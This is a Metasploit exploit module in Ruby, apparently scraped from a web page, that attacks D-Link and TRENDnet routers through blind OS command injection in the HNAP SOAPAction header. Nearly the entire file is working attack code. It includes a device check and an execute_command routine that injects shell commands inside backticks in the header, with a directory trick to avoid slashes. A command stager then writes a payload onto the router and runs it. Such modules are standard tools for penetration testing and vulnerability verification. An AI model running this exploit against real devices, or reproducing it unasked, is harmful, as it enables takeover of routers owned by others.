# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;D-Link Devices HNAP SOAPAction-Header Command Execution&#039;,
      &#039;Description&#039; => %q{
        Different D-Link Routers are vulnerable to OS command injection in the HNAP SOAP
        interface. Since it is a blind OS command injection vulnerability, there is no
        output for the executed command. This module has been tested on a DIR-645 device.
        The following devices are also reported as affected: DAP-1522 revB, DAP-1650 revB,
        DIR-880L, DIR-865L, DIR-860L revA, DIR-860L revB DIR-815 revB, DIR-300 revB,
        DIR-600 revB, DIR-645, TEW-751DR, TEW-733GR
      },
      &#039;Author&#039;      =>
        [
          &#039;Samuel Huntley&#039;, # first public documentation of this Vulnerability on DIR-645
          &#039;Craig Heffner&#039;,  # independent Vulnerability discovery on different other routers
          &#039;Michael Messner <devnull[at]s3cur1ty.de>&#039; # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;URL&#039;, &#039;http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10051&#039;],
          [&#039;URL&#039;, &#039;http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 13 2015&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Targets&#039; =>
        [
          [ &#039;MIPS Little Endian&#039;,
            {
              &#039;Arch&#039;     => ARCH_MIPSLE
            }
          ],
          [ &#039;MIPS Big Endian&#039;,  # unknown if there are BE devices out there ... but in case we have a target
            {
              &#039;Arch&#039;     => ARCH_MIPSBE
            }
          ]
        ],
      &#039;DefaultTarget&#039;    => 0
      ))
 
      deregister_options(&#039;CMDSTAGER::DECODER&#039;, &#039;CMDSTAGER::FLAVOUR&#039;)
  end
 
  def check
    uri = &#039;/HNAP1/&#039;
    soap_action = &#039;http://purenetworks.com/HNAP1/GetDeviceSettings&#039;
 
    begin
      res = send_request_cgi({
        &#039;uri&#039;    => uri,
        &#039;method&#039; => &#039;GET&#039;,
        &#039;headers&#039; => {
          &#039;SOAPAction&#039; => soap_action,
          }
      })
 
      if res && [200].include?(res.code) && res.body =~ /D-Link/
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end
 
    Exploit::CheckCode::Unknown
  end
 
  def exploit
    print_status("#{peer} - Trying to access the device ...")
 
    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable device")
    end
 
    print_status("#{peer} - Exploiting...")
 
    execute_cmdstager(
      :flavour  => :echo,
      :linemax => 200,
      :temp    => &#039;&#039;
    )
  end
 
  def execute_command(cmd, opts)
 
    uri = &#039;/HNAP1/&#039;
 
    # we can not use / in our command so we need to use a little trick
    cmd_new = &#039;cd && cd tmp && export PATH=$PATH:. && &#039; << cmd
    soap_action = "http://purenetworks.com/HNAP1/GetDeviceSettings/`#{cmd_new}`"
 
    begin
      res = send_request_cgi({
        &#039;uri&#039;    => uri,
        &#039;method&#039; => &#039;GET&#039;,
        &#039;headers&#039; => {
          &#039;SOAPAction&#039; => soap_action,
          }
      }, 3)
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end

